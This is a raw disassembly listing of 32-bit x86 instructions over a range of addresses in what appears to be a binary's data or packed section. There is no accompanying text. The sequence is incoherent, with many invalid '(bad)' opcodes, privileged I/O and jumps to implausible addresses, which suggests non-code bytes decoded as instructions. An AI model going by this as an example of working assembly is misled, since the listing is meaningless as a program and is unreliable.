  40508d:	in     al,0x88
  40508f:	(bad)  [edi]
  405091:	or     al,0x59
  405093:	push   edx
  405094:	and    eax,0x43931c53
  405099:	push   ss
  40509a:	pop    edi
  40509b:	xchg   edx,eax
  40509c:	jbe    0x4050db
  40509e:	fs lahf 
  4050a0:	in     eax,0x5a
  4050a2:	daa    
  4050a3:	xlat   BYTE PTR ds:[ebx]
  4050a4:	pushf  
  4050a5:	xchg   edx,eax
  4050a6:	(bad)  
  4050a7:	ret    0x2aac
  4050aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4050ab:	sbb    al,0x71
  4050ad:	push   cs
  4050ae:	jae    0x40508f
  4050b0:	mov    edi,DWORD PTR [ecx]
  4050b2:	or     edi,ebx
  4050b4:	jmp    0x4050fc
  4050b6:	pop    esp
  4050b7:	sub    eax,0x3431ecb5
  4050bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4050bd:	rcl    BYTE PTR [ecx],1
  4050bf:	outs   dx,DWORD PTR ds:[esi]
  4050c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050c1:	imul   edx,DWORD PTR [edi+ecx*2],0xfbc8d5dd
  4050c8:	xlat   BYTE PTR ds:[ebx]
  4050c9:	inc    edx
  4050ca:	rcr    BYTE PTR [eax-0x39],1
  4050cd:	out    0x49,al
  4050cf:	leave  
  4050d0:	inc    eax
  4050d1:	mov    edx,0xc9602c27
  4050d6:	inc    edx
  4050d7:	mov    ds:0x1fa3de17,eax
  4050dc:	pop    esp
  4050dd:	dec    ebp
  4050de:	cdq    
  4050df:	push   ds
  4050e0:	jl     0x40507a
  4050e2:	int3   
  4050e3:	cmp    eax,0xd88783f1
  4050e8:	gs push esi
  4050ea:	mov    ecx,0x28dc4576
  4050ef:	mov    ch,0x78
  4050f1:	cmc    
  4050f2:	mov    ebx,0x35d07628
  4050f7:	cmp    DWORD PTR [ebx-0x237ef631],esi
  4050fd:	lea    edi,[edi+edi*4+0x6ffbea1c]
  405104:	adc    al,0xf
  405106:	inc    ebx
  405107:	sub    al,0xf6
  405109:	add    eax,0x9d0ea85e
  40510e:	jb     0x405129
  405110:	inc    esi
  405111:	test   al,0x76
  405113:	cli    
  405114:	jp     0x4050d9
  405116:	stos   BYTE PTR es:[edi],al
  405117:	test   al,0x2e
  405119:	cmp    eax,0x48763f2f
  40511e:	pop    esp
  40511f:	ins    DWORD PTR es:[edi],dx
  405120:	retf   0x13e2
  405123:	cmp    al,dl
  405125:	pusha  
  405126:	add    DWORD PTR [eax-0x31d2a93d],eax
  40512c:	jmp    0xa24001e9
  405131:	cmp    BYTE PTR [edx],cl
  405133:	push   0x97f5001b
  405138:	test   BYTE PTR ds:0xeee5fd97,0xb6
  40513f:	jmp    0xd11982b5
  405144:	dec    ebp
  405145:	pop    ecx
  405146:	inc    edx
  405147:	adc    BYTE PTR [ebp+0x5b],dh
  40514a:	aaa    
  40514b:	fistp  WORD PTR [ebp-0x7b0607a1]
  405151:	sub    BYTE PTR [ebx],cl
  405153:	lods   al,BYTE PTR cs:[esi]
  405155:	fsub   st,st(7)
  405157:	sar    BYTE PTR [ebx],cl
  405159:	fimul  WORD PTR [ebp-0x48fb3bba]
  40515f:	sbb    al,0xde
  405161:	xor    DWORD PTR [ebp+0x69e0b09d],0x20
  405168:	pop    eax
  405169:	or     ebx,DWORD PTR ds:0xbb4e40e8
  40516f:	inc    ebp
  405170:	and    DWORD PTR [eax],eax
  405172:	inc    ecx
  405173:	jge    0x40512a
  405175:	(bad)  [edx+0x55]
  405178:	pop    ebp
  405179:	icebp  
  40517a:	sti    
  40517b:	pop    esi
  40517c:	fwait
  40517d:	into   
  40517e:	(bad)  
  40517f:	stc    
  405180:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405181:	adc    eax,0xf6ac4f04
  405186:	test   eax,0xd1ba55a0
  40518b:	sub    bh,BYTE PTR [ecx+edx*1+0x50e2ee92]
  405192:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405193:	dec    eax
  405194:	mov    al,0xd4
  405196:	adc    al,0x8
  405198:	scas   al,BYTE PTR es:[edi]
  405199:	pop    ds
  40519a:	cmc    
  40519b:	mov    ebp,0x6f498c00
  4051a0:	mov    al,ds:0x40f69422
  4051a5:	cli    
  4051a6:	fisttp WORD PTR [eax+0x38]
  4051a9:	pushf  
  4051aa:	cwde   
  4051ab:	mov    cl,0x65
  4051ad:	jae    0x40519e
  4051af:	push   edx
  4051b0:	scas   eax,DWORD PTR es:[edi]
  4051b1:	dec    eax
  4051b2:	or     cl,BYTE PTR [eax+eiz*2-0x5f]
  4051b6:	popa   
  4051b7:	test   BYTE PTR [edx+0x5d],bh
  4051ba:	loopne 0x405194
  4051bc:	jae    0x40522a
  4051be:	in     eax,dx
  4051bf:	sbb    al,0x7a
  4051c1:	or     BYTE PTR [ebp+0x5c362f73],bl
  4051c7:	push   ecx
  4051c8:	jbe    0x40523a
  4051ca:	test   BYTE PTR [ecx-0x6e],0x52
  4051ce:	pop    ebp
  4051cf:	xlat   BYTE PTR ds:[ebx]
  4051d0:	(bad)  
  4051d1:	push   eax
  4051d2:	xchg   esi,eax
  4051d3:	jecxz  0x4051c1
  4051d5:	data16 cs data16 stos BYTE PTR es:[edi],al
  4051d9:	rol    al,1
  4051db:	mov    cl,0xb8
  4051dd:	pusha  
  4051de:	or     esp,DWORD PTR [ebx-0x75]
  4051e1:	out    0x47,eax
  4051e3:	mov    ch,0x37
  4051e5:	mov    esi,0x2b709e7c
  4051ea:	pop    esi
  4051eb:	xchg   ebp,eax
  4051ec:	sub    DWORD PTR [ebp+edi*1-0x2096b00a],0xffffffb7
  4051f4:	jl     0x405233
  4051f6:	stos   DWORD PTR es:[edi],eax
  4051f7:	aaa    
  4051f8:	pop    edx
  4051f9:	loop   0x4051b8
  4051fb:	inc    edx
  4051fc:	xchg   BYTE PTR [ebx],dl
  4051fe:	iret   
  4051ff:	mov    ch,0x16
  405201:	mov    bh,0xe2
  405203:	pop    ecx
  405204:	outs   dx,WORD PTR ds:[esi]
  405206:	mov    ebp,0x2017c5c1
  40520b:	xor    al,0x38
  40520d:	mov    esp,0x359ab3a
  405212:	dec    ebp
  405213:	sbb    BYTE PTR [ecx+eax*2],0xe
  405217:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405218:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405219:	xchg   bh,cl
  40521b:	xchg   edi,eax
  40521c:	dec    eax
  40521d:	cmp    eax,0x7def4cc1
  405222:	mov    ebx,0x2c60fa21
  405227:	jg     0x4051d8
  405229:	adc    DWORD PTR [esi],edi
  40522b:	stos   DWORD PTR es:[edi],eax
  40522c:	and    al,0x96
  40522e:	or     ebx,DWORD PTR [esi+0x14]
  405231:	pusha  
  405232:	jle    0x4051d8
  405234:	pop    edx
  405235:	inc    edx
  405236:	mov    ah,0x67
  405238:	dec    ebp
  405239:	xor    BYTE PTR [edi],0x6
  40523c:	mov    cl,ch
  40523e:	add    eax,0x44c4dd5f
  405243:	sbb    esp,ebp
  405245:	mov    esi,0x67ff0a78
  40524a:	push   edi
  40524b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40524c:	test   eax,0x3418a5ba
  405251:	mov    ah,0xaf
  405253:	dec    ebx
  405254:	out    0x52,eax
  405256:	(bad)  
  405257:	icebp  
  405258:	adc    eax,0x3e578d7e
  40525d:	sub    eax,eax
  40525f:	xor    ah,BYTE PTR [ebx]
  405261:	dec    ecx
  405262:	lock ja 0x4052d7
  405265:	shl    BYTE PTR [eax+0x73],cl
  405268:	iret   
  405269:	mov    ebp,0x1c7de01c
  40526e:	inc    esp
  40526f:	sbb    BYTE PTR [esi+0x46],bh
  405272:	pushf  
  405273:	pushf  
  405274:	rcl    DWORD PTR [ebx+eax*8-0x2eb6e1bd],1
  40527b:	and    BYTE PTR [edx+0x5a],cl
  40527e:	jg     0x4052ec
  405280:	pop    ecx
  405281:	and    eax,0x64c91c7a
  405286:	pop    ebx
  405287:	lods   eax,DWORD PTR ds:[esi]
  405288:	adc    BYTE PTR [eax+0x29],bl
  40528b:	mov    ah,0x5f
  40528d:	test   al,0xdf
  40528f:	stos   BYTE PTR es:[edi],al
  405290:	loope  0x40526a
  405292:	jne    0x40529c
  405294:	jbe    0x40528f
  405296:	push   ss
  405297:	xchg   edi,eax
  405298:	cdq    
  405299:	mov    ebp,0x5d951833
  40529e:	dec    esi
  40529f:	nop
  4052a0:	jnp    0x40526c
  4052a2:	repz or al,0x57
  4052a5:	add    DWORD PTR [ebx+0x3dc34eb1],0x78b8e4de
  4052af:	sub    DWORD PTR [esi-0x63c97175],ecx
  4052b5:	sub    edx,DWORD PTR ds:[ebp-0x74f1a420]
  4052bc:	ret    
  4052bd:	and    al,0x27
  4052bf:	push   ds
  4052c0:	ins    DWORD PTR es:[edi],dx
  4052c1:	into   
  4052c2:	fmul   DWORD PTR [ebx+0x2f]
  4052c5:	dec    edi
  4052c6:	frstor [eax-0x18038ed4]
  4052cc:	or     DWORD PTR [ebx+0x3f9b01d1],0xe48b9aeb
  4052d6:	inc    edi
  4052d7:	pop    ds
  4052d8:	fisub  WORD PTR [eax+0x40]
  4052db:	in     al,0x9d
  4052dd:	stos   DWORD PTR es:[edi],eax
  4052de:	adc    al,0xcc
  4052e0:	jns    0x40535e
  4052e2:	or     eax,0xa8e438c
  4052e7:	shl    ebx,cl
  4052e9:	lea    esi,ds:0x375f8620
  4052ef:	in     eax,0xb8
  4052f1:	pop    eax
  4052f2:	push   ds
  4052f3:	test   eax,0x2e6d6d57
  4052f8:	dec    edi
  4052f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4052fa:	add    al,0xb3
  4052fc:	mov    bh,0x6
  4052fe:	test   al,0x36
  405300:	mov    edi,0x14eee117
  405305:	pusha  
  405306:	sub    BYTE PTR [eax+0x66a582ff],0xb7
  40530d:	fldcw  WORD PTR [ebp+0x31aecd88]
  405313:	and    BYTE PTR [ecx],cl
  405315:	xchg   esp,eax
  405316:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  405318:	stos   BYTE PTR es:[edi],al
  405319:	icebp  
  40531a:	inc    edx
  40531b:	aas    
  40531c:	sti    
  40531d:	je     0x405387
  40531f:	xchg   BYTE PTR ds:0x9619e456,ch
  405325:	jle    0x40530b
  405327:	fndisi(8087 only) 
  405329:	add    ebx,0xb1fd218c
  40532f:	jb     0x405303
  405331:	xor    al,0xc2
  405333:	push   esi
  405334:	mov    al,0xa7
  405336:	mov    dl,0x8d
  405338:	inc    ebp
  405339:	inc    ebx
  40533a:	sub    DWORD PTR [edi+0x413f04ff],ebp
  405340:	or     cl,BYTE PTR es:[edx-0x49f09a2f]
  405347:	fwait
  405348:	es cdq 
  40534a:	adc    ch,BYTE PTR [ecx-0x21]
  40534d:	jae    0x40531a
  40534f:	jmp    DWORD PTR [eax]
  405351:	cmp    eax,0x666854bc
  405356:	push   cs
  405357:	rcl    BYTE PTR [ecx+0x1b],cl
  40535a:	and    eax,0x6e97a749
  40535f:	dec    ecx
  405360:	mov    ?,WORD PTR [edx+0xb17812b]
  405366:	xchg   DWORD PTR [edi+0x1941ab1f],esp
  40536c:	stc    
  40536d:	adc    dl,ch
  40536f:	es int3 
  405371:	and    eax,0xeb2c441
  405376:	dec    eax
  405377:	push   esi
  405378:	cld    
  405379:	popa   
  40537a:	xchg   edi,eax
  40537b:	and    al,0x6e
  40537d:	fsubr  QWORD PTR [ebp+0x40]
  405380:	xchg   BYTE PTR [edi*8-0x4869d363],ah
  405387:	ficom  DWORD PTR [edi]
  405389:	sbb    DWORD PTR [ebp-0x35f37f32],edx
  40538f:	sub    edx,DWORD PTR [ecx+0x267d2f98]
  405395:	adc    al,0xb8
  405397:	adc    eax,0x8e8e4ff3
  40539c:	and    BYTE PTR [ebx+0x26b92d0d],ch
  4053a2:	mov    eax,ebx
  4053a4:	pop    edx
  4053a5:	xchg   edi,eax
  4053a6:	sbb    edi,DWORD PTR [ebx]
  4053a8:	call   0xffba16d3
  4053ad:	rol    BYTE PTR [esi-0x5d],1
  4053b0:	xchg   ebx,eax
  4053b1:	je     0x40534f
  4053b3:	loope  0x405340
  4053b5:	or     eax,0x602bc3aa
  4053ba:	push   ecx
  4053bb:	mov    cs,WORD PTR [edx]
  4053bd:	mov    edx,0x7e62f4d7
  4053c2:	fucomp st(3)
  4053c4:	sbb    BYTE PTR ds:0x2dec0263,dh
  4053ca:	inc    ebp
  4053cb:	xchg   dl,ah
  4053cd:	sub    BYTE PTR [esi-0x6bc807fb],ch
  4053d3:	and    cl,BYTE PTR [edx+0x67]
  4053d6:	or     ebp,esi
  4053d8:	addr16 pop ebp
  4053da:	inc    eax
  4053db:	sbb    DWORD PTR [ebp+0x61f5ed79],esi
  4053e1:	test   BYTE PTR [eax-0x35],bl
  4053e4:	ss sub dh,al
  4053e7:	loope  0x4053ab
  4053e9:	or     eax,0x2294e69a
  4053ee:	dec    edx
  4053ef:	add    ebx,ebp
  4053f1:	outs   dx,DWORD PTR ds:[esi]
  4053f2:	outs   dx,DWORD PTR ds:[esi]
  4053f3:	lock fsubr QWORD PTR [esp+ebp*1-0x26]
  4053f8:	pop    eax
  4053f9:	push   ecx
  4053fa:	lock sub bl,ch
  4053fd:	pop    ss
  4053fe:	test   al,0x93
  405400:	lea    ebp,[esi]
  405402:	dec    esp
  405403:	xchg   bp,ax
  405405:	mov    ah,0x97
  405407:	xor    BYTE PTR [eax+0x5a],bl
  40540a:	(bad)  
  40540b:	cmp    eax,0x8ca39aac
  405410:	sbb    eax,0xacd1a71e
  405415:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405416:	mov    ds:0xedc296e,eax
  40541b:	arpl   bx,bx
  40541d:	das    
  40541e:	and    ah,BYTE PTR [edi+0x25]
  405421:	push   edx
  405422:	adc    ah,dl
  405424:	or     eax,0xcce6357c
  405429:	inc    esp
  40542a:	push   esp
  40542b:	ins    DWORD PTR es:[edi],dx
  40542c:	dec    DWORD PTR [edi]
  40542e:	jb     0x405495
  405430:	mov    al,ds:0x448d7cff
  405435:	dec    esp
  405436:	test   DWORD PTR [eax+0x6c],ecx
  405439:	cwde   
  40543a:	cmp    eax,0x52b9b548
  40543f:	xor    ah,BYTE PTR fs:[edi+0x35c59d60]
  405446:	sbb    al,0x4b
  405448:	cli    
  405449:	cmp    ch,BYTE PTR [eax+0x67944bcb]
  40544f:	clc    
  405450:	stos   DWORD PTR es:[edi],eax
  405451:	fimul  WORD PTR [eax-0x43ca37b9]
  405457:	mov    ds:0xe64eae45,al
  40545c:	mov    ds:0xcbf031af,eax
  405461:	xchg   ebx,eax
  405462:	call   0x33df:0xf96b8ef5
  405469:	jns    0x4054c2
  40546b:	push   cs
  40546c:	retf   0x1108
  40546f:	mov    ebp,0xb6d9f578
  405474:	ficomp DWORD PTR [ecx]
  405476:	cld    
  405477:	(bad)  
  405478:	in     al,dx
  405479:	je     0x40547e
  40547b:	pop    esp
  40547c:	nop
  40547d:	cld    
  40547e:	cmp    DWORD PTR [edi+esi*4-0x6c],ebp
  405482:	into   
  405483:	mov    dl,0xfc
  405485:	out    dx,al
  405486:	mov    BYTE PTR [ebx],al
  405488:	or     eax,ebp
  40548a:	gs xor cl,al
  40548d:	dec    eax
  40548e:	add    eax,0x933dbc87
  405493:	sti    
  405494:	dec    ecx
  405495:	push   ebp
  405496:	sub    al,0x94
  405498:	sub    al,0x28
  40549a:	cmp    eax,ebp
  40549c:	xlat   BYTE PTR ds:[ebx]
  40549d:	mov    ebx,0xd3933b31
  4054a2:	mov    ebx,0x1dad3a87
  4054a7:	aad    0x52
  4054a9:	xor    edi,DWORD PTR [ecx-0x5]
  4054ac:	iret   
  4054ad:	inc    ebp
  4054ae:	inc    esp
  4054af:	(bad)  
  4054b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054b1:	pop    esp
  4054b2:	jle    0x40543f
  4054b4:	test   al,0xd0
  4054b6:	inc    esi
  4054b7:	cmp    DWORD PTR cs:[edx+ecx*8-0x57],0x11a67ad0
  4054c0:	mov    esp,0x89f91061
  4054c5:	pop    esp
  4054c6:	imul   BYTE PTR [ebx+0x4ef09ac2]
  4054cc:	inc    ebx
  4054cd:	fimul  WORD PTR [ebx+0x1a55ac63]
  4054d3:	xor    DWORD PTR [edx-0x6e],0xc72eed7
  4054da:	xlat   BYTE PTR ds:[ebx]
  4054db:	mov    ch,0x55
  4054dd:	ficom  WORD PTR [edx]
  4054df:	leave  
  4054e0:	int3   
  4054e1:	das    
  4054e2:	leave  
  4054e3:	enter  0x8877,0x2a
  4054e7:	jge    0x4054b4
  4054e9:	xchg   esp,eax
  4054ea:	fisub  DWORD PTR [edx-0x5f7e751b]
  4054f0:	pop    ecx
  4054f1:	dec    ecx
  4054f2:	outs   dx,BYTE PTR ds:[esi]
  4054f3:	mov    esi,0x29774f5c
  4054f8:	cmc    
  4054f9:	sti    
  4054fa:	inc    esi
  4054fb:	retf   0xb020
  4054fe:	dec    eax
  4054ff:	jg     0x405540
  405501:	pop    edx
  405502:	es dec edx
  405504:	add    DWORD PTR [eax+eax*4],esi
  405507:	adc    al,ch
  405509:	xor    ch,ah
  40550b:	xchg   BYTE PTR [esi],cl
  40550d:	lea    edi,[edx+0x6646f560]
  405513:	fimul  WORD PTR [ebx+0x2aad30a5]
  405519:	(bad)  
  40551a:	push   ebp
  40551b:	stc    
  40551c:	das    
  40551d:	inc    edx
  40551e:	cwde   
  40551f:	mov    dh,0xcc
  405521:	sti    
  405522:	arpl   WORD PTR [esi-0x4dd37d76],bp
  405528:	adc    edi,DWORD PTR [ebx]
  40552a:	(bad)  
  40552b:	cli    
  40552c:	leave  
  40552d:	popa   
  40552e:	jns    0x40556c
  405530:	retf   
  405531:	and    ch,BYTE PTR [ebx+edi*4-0x10b711c7]
  405538:	cli    
  405539:	jg     0x405513
  40553b:	in     al,dx
  40553c:	outs   dx,BYTE PTR ds:[esi]
  40553d:	mov    ecx,0x60289d1
  405542:	cld    
  405543:	xor    eax,0xee1fa1b6
  405548:	das    
  405549:	sub    DWORD PTR [edi+0x6cbb3f1c],esp
  40554f:	mov    bh,0x91
  405551:	dec    esp
  405552:	in     eax,dx
  405553:	inc    edx
  405554:	cmp    DWORD PTR [esi-0x25333db7],0x1c59680f
  40555e:	cmp    BYTE PTR [eax],dl
  405560:	xor    dl,BYTE PTR [edx+0x1bf77682]
  405566:	aas    
  405567:	xor    edx,0xfe8d44b
  40556d:	fs mov ah,0x32
  405570:	push   ecx
  405571:	adc    esi,esi
  405573:	jge    0x405502
  405575:	movq   mm3,QWORD PTR [eax]
  405578:	mov    al,ds:0xd4166eaf
  40557d:	jmp    0xc651:0xe92b2d21
  405584:	push   ebx
  405585:	stos   DWORD PTR es:[edi],eax
  405586:	sub    dh,bh
  405588:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405589:	cmp    eax,0x6aca4526
  40558e:	(bad)  
  405590:	xchg   esp,eax
  405591:	or     esp,DWORD PTR [esi+0x1d]
  405594:	dec    eax
  405595:	fwait
  405596:	jmp    0x40560e
  405598:	test   DWORD PTR [edx],ebx
  40559a:	cmp    dl,dl
  40559c:	cmp    cl,BYTE PTR [ebx+0x7d1fadb9]
  4055a2:	mov    al,ds:0xedd0d0d
  4055a7:	rol    BYTE PTR [esi+0x19],0x27
  4055ab:	sbb    BYTE PTR [edx-0x2dd684cd],al
  4055b1:	cmp    al,0x4a
  4055b3:	or     eax,DWORD PTR [ecx]
  4055b5:	jo     0x405617
  4055b7:	iret   
  4055b8:	xchg   esp,eax
  4055b9:	inc    eax
  4055ba:	xor    edi,DWORD PTR [edx+0x28169d23]
  4055c0:	enter  0x5d0d,0xe2
  4055c4:	test   al,0x31
  4055c6:	cmovl  ebx,DWORD PTR [edx]
  4055c9:	ret    0xf73b
  4055cc:	popf   
  4055cd:	and    al,0x7f
  4055cf:	xlat   BYTE PTR ds:[ebx]
  4055d0:	add    al,0x69
  4055d2:	mov    dl,0xb1
  4055d4:	jmp    0x165342db
  4055d9:	cmp    BYTE PTR [ebx+ebx*8],cl
  4055dc:	and    DWORD PTR [eax+0x20636c4e],ebp
  4055e2:	jbe    0x405660
  4055e4:	sbb    DWORD PTR [edi-0x311d2fd9],0xffffffdc
  4055eb:	pop    ecx
  4055ec:	pop    esp
  4055ed:	test   al,0xa8
  4055ef:	fisub  WORD PTR [esi-0x2b]
  4055f2:	sub    eax,0x2b573558
  4055f7:	(bad)  
  4055f8:	clc    
  4055f9:	dec    ebp
  4055fa:	sar    DWORD PTR [edx-0x1f5d20fc],1
  405600:	add    bl,BYTE PTR [ebp-0x16]
  405603:	std    
  405604:	push   ds
  405605:	daa    
  405606:	mov    edx,0x348dd362
  40560b:	mov    ?,esp
  40560d:	push   0xf47187a9
  405612:	loope  0x405663
  405614:	xchg   dl,bh
  405616:	stc    
  405617:	dec    esp
  405618:	pushf  
  405619:	and    al,BYTE PTR [eax+ebp*8-0x6f49dd45]
  405620:	inc    ecx
  405621:	loope  0x405683
  405623:	or     DWORD PTR [eax+0x6c],edx
  405626:	pop    ebx
  405627:	push   es
  405628:	pop    esp
  405629:	iret   
  40562a:	dec    ebp
  40562b:	cs sub al,0xa4
  40562e:	es popf 
  405630:	pop    ecx
  405631:	xchg   ebp,eax
  405632:	aaa    
  405633:	pop    eax
  405634:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405635:	xlat   BYTE PTR ds:[ebx]
  405636:	cmp    al,0xa3
  405638:	mov    cl,0xc0
  40563a:	mov    al,ds:0xd3127c9d
  40563f:	je     0x4056b0
  405641:	arpl   WORD PTR ds:0xef7b4528,bx
  405647:	xor    BYTE PTR [esi],ah
  405649:	dec    esp
  40564a:	imul   esp,DWORD PTR [eax],0x2726cc73
  405650:	push   ebx
  405651:	fld    TBYTE PTR [edi-0x606608f5]
  405657:	and    eax,0x22a05fc5
  40565c:	mov    bh,BYTE PTR [ebp+0x17]
  40565f:	adc    ecx,DWORD PTR [esi+0x1e]
  405662:	push   esi
  405663:	pop    es
  405664:	mov    edx,DWORD PTR [ebx-0x477a9f67]
  40566a:	ror    DWORD PTR [edi+0x384341d9],cl
  405670:	ret    0xcff4
  405673:	cmp    dl,dl
  405675:	inc    esi
  405676:	call   DWORD PTR [esi+0x46d745db]
  40567c:	or     BYTE PTR [edx+0x30],dh
  40567f:	fisttp DWORD PTR [eax]
  405681:	arpl   WORD PTR [eax-0x7],bx
  405684:	mov    ah,bh
  405686:	out    0xc7,al
  405688:	shl    al,1
  40568a:	repnz aaa 
  40568c:	dec    ecx
  40568d:	mov    esp,0x5349cac2
  405692:	jns    0x405704
  405694:	(bad)  
  405695:	sar    BYTE PTR [ebx-0x28157570],cl
  40569b:	pop    edi
  40569c:	sbb    DWORD PTR [ecx-0x6c74ba55],0x71
  4056a3:	and    ah,0x9
  4056a6:	stos   BYTE PTR es:[edi],al
  4056a7:	and    eax,0x7479d7d3
  4056ac:	je     0x405651
  4056ae:	and    ah,BYTE PTR [ebx+0x59]
  4056b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056b2:	(bad)  [ebx]
  4056b4:	dec    esp
  4056b5:	out    0xd4,al
  4056b7:	test   DWORD PTR [ebp+0x73],ebx
  4056ba:	jmp    0x405675
  4056bc:	popf   
  4056bd:	pushf  
  4056be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056bf:	mov    ebp,0xf2ed6c24
  4056c4:	pop    ebx
  4056c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056c6:	pop    eax
  4056c7:	in     eax,dx
  4056c8:	jp     0x4056cb
  4056ca:	cmp    al,BYTE PTR [ebx-0x5f0c9df5]
  4056d0:	sahf   
  4056d1:	pop    edx
  4056d2:	in     eax,dx
  4056d3:	aas    
  4056d4:	dec    eax
  4056d5:	dec    ebp
  4056d6:	aam    0x50
  4056d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056d9:	or     al,BYTE PTR [ebp+0xc]
  4056dc:	stos   BYTE PTR es:[edi],al
  4056dd:	push   esp
  4056de:	sbb    DWORD PTR [edi+0x70a22518],ebp
  4056e4:	adc    ebx,DWORD PTR [esi+ebx*1]
  4056e7:	xchg   esi,eax
  4056e8:	lds    ecx,FWORD PTR [eax+0x14]
  4056eb:	sbb    DWORD PTR [edx+0x2b3511cb],0x28
  4056f2:	push   esi
  4056f3:	arpl   bp,cx
  4056f5:	push   ds
  4056f6:	sub    eax,0x156bcbc2
  4056fb:	fist   WORD PTR [edx-0x3a]
  4056fe:	enter  0x5b7,0x30
  405702:	call   esp
  405704:	push   eax
  405705:	cmp    eax,0x44867ff6
  40570a:	or     DWORD PTR [ecx-0x3f],edx
  40570d:	iret   
  40570e:	and    al,0x9a
  405710:	mov    dl,BYTE PTR [ebx-0x744ac5d0]
  405716:	or     al,0x9c
  405718:	xlat   BYTE PTR ds:[ebx]
  405719:	add    al,0xdb
  40571b:	xor    bl,bh
  40571d:	pop    ds
  40571e:	sub    edx,edi
  405720:	sub    eax,0x36e8fca4
  405725:	loope  0x4056ac
  405727:	push   edx
  405728:	gs dec eax
  40572a:	mov    dh,0x4a
  40572c:	cli    
  40572d:	pop    edi
  40572e:	xchg   ebx,eax
  40572f:	mov    bh,0x10
  405731:	sub    DWORD PTR [eax+0x25],0x65
  405735:	and    BYTE PTR [ebx-0xd],0x2c
  405739:	xor    DWORD PTR [eax],ebp
  40573b:	pop    esi
  40573c:	inc    ecx
  40573d:	arpl   bp,dx
  40573f:	pop    ss
  405740:	mov    ch,0xa8
  405742:	sbb    dh,BYTE PTR [eax+eax*4-0x5381a984]
  405749:	nop
  40574a:	imul   edx,DWORD PTR [ebx-0x254217cc],0x471651c2
  405754:	cs call 0xa407fcd0
  40575a:	push   ds
  40575b:	adc    esp,ebp
  40575d:	mov    esi,0x380cfa7f
  405762:	jb     0x405771
  405764:	shl    BYTE PTR [eax-0x67],0x10
  405768:	hlt    
  405769:	es imul ecx,DWORD PTR ss:[di-0xb93],0xffffffa0
  405771:	out    dx,al
  405772:	jmp    0x405729
  405774:	cmp    al,0x49
  405776:	dec    DWORD PTR [edi+0x400fd0d9]
  40577c:	jmp    0xb0a6:0x1f46e286
  405783:	inc    edx
  405784:	jle    0x40575d
  405786:	shl    eax,0x68
  405789:	daa    
  40578a:	pop    ebx
  40578b:	or     eax,0x61fcc4ca
  405790:	jb     0x4057f4
  405792:	scas   eax,DWORD PTR es:[edi]
  405793:	outs   dx,DWORD PTR ds:[esi]
  405794:	fs push cs
  405796:	loop   0x4057d1
  405798:	or     esi,DWORD PTR [edx+0x568b4d24]
  40579e:	cli    
  40579f:	f2xm1  
  4057a1:	xor    eax,0xeb84797f
  4057a6:	pusha  
  4057a7:	mov    ds:0x9088ba87,al
  4057ac:	pushf  
  4057ad:	jno    0x40579d
  4057af:	fnstcw WORD PTR ds:[eax]
  4057b2:	sbb    al,0x2d
  4057b4:	lods   eax,DWORD PTR ds:[esi]
  4057b5:	pop    ecx
  4057b6:	sub    eax,0xc410bf8c
  4057bb:	inc    ebx
  4057bc:	mov    ebp,0xef1e2afb
  4057c1:	sub    al,0x70
  4057c3:	or     BYTE PTR [eax+0x4d26ba6a],0x9b
  4057ca:	pop    edi
  4057cb:	or     ah,BYTE PTR [esi]
  4057cd:	lea    ecx,[edx+0x4d]
  4057d0:	sbb    cl,BYTE PTR [ebx-0x7fee1321]
  4057d6:	fldcw  WORD PTR [ecx]
  4057d8:	pop    bp
  4057da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057db:	(bad)  
  4057dc:	iret   
  4057dd:	stos   BYTE PTR es:[edi],al
  4057de:	aad    0x3a
  4057e0:	lods   al,BYTE PTR ds:[esi]
  4057e1:	dec    eax
  4057e2:	mov    ah,0xc4
  4057e4:	add    ah,BYTE PTR [edi+0x6e]
  4057e7:	dec    esi
  4057e8:	fsubr  DWORD PTR [eax+0x51]
  4057eb:	mov    fs:0xa2701cd7,al
  4057f1:	adc    esp,DWORD PTR [ebp+edx*1+0x2aecfce0]
  4057f8:	xor    al,0xe8
  4057fa:	xor    bh,BYTE PTR [eax+0x55]
  4057fd:	(bad)  
  4057fe:	into   
  4057ff:	inc    esi
  405800:	mov    bh,0x4a
  405802:	cwde   
  405803:	jne    0x405876
  405805:	jle    0x405837
  405807:	ficom  WORD PTR [ecx+0x2d949a2]
  40580d:	cmp    al,0x2d
  40580f:	xor    edx,eax
  405811:	xchg   esp,eax
  405812:	mov    ds:0x633c6456,al
  405817:	out    0xfd,al
  405819:	add    BYTE PTR [eax+0xcab7b31],dh
  40581f:	add    DWORD PTR [edx+0x57d712a0],0x1bc1277
  405829:	jo     0x4057af
  40582b:	(bad)  [eax]
  40582d:	outs   dx,DWORD PTR ds:[esi]
  40582e:	pop    ss
  40582f:	lods   al,BYTE PTR ds:[esi]
  405830:	mov    edx,0x9cd6c372
  405835:	and    ch,ah
  405837:	test   edx,esi
  405839:	aas    
  40583a:	inc    eax
  40583b:	xchg   ebx,eax
  40583c:	int3   
  40583d:	cwde   
  40583e:	jnp    0x4057cc
  405840:	ror    BYTE PTR [ebx-0x4ee960db],cl
  405846:	repz sub BYTE PTR [esi-0x36],bl
  40584a:	cmp    eax,0xc2747b89
  40584f:	xchg   edx,eax
  405850:	aam    0xc3
  405852:	xchg   ebx,eax
  405853:	outs   dx,BYTE PTR ds:[esi]
  405854:	jb     0x4057e5
  405856:	pop    ebp
  405857:	add    DWORD PTR [eax],0x58
  40585a:	sahf   
  40585b:	xor    eax,edi
